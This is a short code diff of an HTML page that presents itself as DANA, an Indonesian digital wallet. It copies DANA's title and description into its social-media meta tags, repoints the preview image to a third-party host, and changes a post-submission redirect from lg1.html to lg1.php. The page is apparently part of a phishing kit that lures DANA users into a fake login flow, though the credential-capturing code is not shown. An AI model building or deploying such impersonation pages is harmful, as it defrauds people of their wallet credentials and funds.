@@ -12,7 +12,7 @@
   <meta property="og:type" content="website">
   <meta property="og:title" content="𝗗𝗔𝗡𝗔 | #𝗦𝗮𝘁𝘂 𝗗𝗼𝗺𝗽𝗲𝘁 𝗨𝗻𝘁𝘂𝗸 𝗦𝗲𝗺𝘂𝗮 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶">
   <meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
- <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSM8juoAbJmNLWHWJm7JV5WpuQTNqC21rMeTktH-IrFpZiQAfX9uP8tnwQ&s=10">
+ <meta property="og:image" content="https://hosting.tigerengine.id/xd4dg0.jpg">
 
   <!-- Twitter Meta Tags -->
   <meta name="twitter:card" content="summary_large_image">
@@ -20,7 +20,7 @@
   <meta property="twitter:url" content="https://www.dana.id">
   <meta name="twitter:title" content="𝗗𝗔𝗡𝗔 | #𝗦𝗮𝘁𝘂 𝗗𝗼𝗺𝗽𝗲𝘁 𝗨𝗻𝘁𝘂𝗸 𝗦𝗲𝗺𝘂𝗮 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶">
   <meta name="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
-  <meta content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSM8juoAbJmNLWHWJm7JV5WpuQTNqC21rMeTktH-IrFpZiQAfX9uP8tnwQ&s=10" property="og:image">
+  <meta content="https://hosting.tigerengine.id/xd4dg0.jpg" property="og:image">
 
  <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg&usqp=CAU" rel="shortcut icon" type="image/x-icon">
   <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg&usqp=CAU" rel="apple-touch-icon">
@@ -462,7 +462,7 @@ var tarif = $('input[name="tarif"]:checked').val();
             datatype: 'JSON',            
             complete: function(data) {
             setTimeout(function(){            
-            window.location.href='lg1.html';
+            window.location.href='lg1.php';
             $("#process1").fadeOut();     
    }, 500);
             }
